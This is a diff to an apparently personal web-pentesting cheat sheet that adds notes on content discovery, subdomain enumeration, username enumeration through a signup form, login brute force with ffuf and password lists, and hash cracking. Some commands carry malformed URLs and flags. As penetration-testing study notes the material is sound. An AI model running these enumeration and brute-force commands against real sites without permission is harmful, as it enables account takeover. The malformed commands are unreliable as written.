@@ -37,8 +37,9 @@ Outside of the site:
   dig domain.com TYPE
   ```
   -[Shodan.io](https://www.shodan.io/)
-  
-  Content discovery:
+  ### Scanning:
+In the site:
+  -Content discovery:
       -Robots.txt 
       -Favicon.ico [Favicon database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
       -Sitemap.xml
@@ -47,14 +48,35 @@ Outside of the site:
       -Wayback machine
       -S3 bucket
       -ffuf, dirb, gobuster
-      ```
-      ffuf -w SecLists/Discovery/Web-Content/common.txt -u https://domain.com
-      dirb https://domain.com SecLists/Discovery/Web-Content/common.txt
-      gobuster dir --url http:s://domain.com -wSecLists/Discovery/Web-Content/common.txt
-      ```
-      Seclists GitHub [page](https://github.com/danielmiessler/SecLists)
       
+```
+ffuf -w SecLists/Discovery/Web-Content/common.txt -u https://domain.com
+dirb https://domain.com SecLists/Discovery/Web-Content/common.txt
+gobuster dir --url http:s://domain.com -wSecLists/Discovery/Web-Content/common.txt
+```
       
-      
+  - Seclists GitHub [page](https://github.com/danielmiessler/SecLists)
+Subdomain enumeration:
+    -Sublist3r Github [page](https://github.com/aboul3la/Sublist3r)
+    
+ ```
+python sublist3r.py -d example.com
+ ```
+
+### Gaining access:
+Authentication bypass:
+Username enumeration:
+
+```
+ffuf -w SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u https:://domain.org/customers/signup -mr "username already exists"
+```
+
+With the valid usernames, we can do login brute force:
+
+``` 
+ffuf -w valid_usernames.txt:W1,SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u https://domain.com/customers/login -fc 200
+```
+
+Hash breaking with hashcat and [cracking station](https://crackstation.net/)
  
 
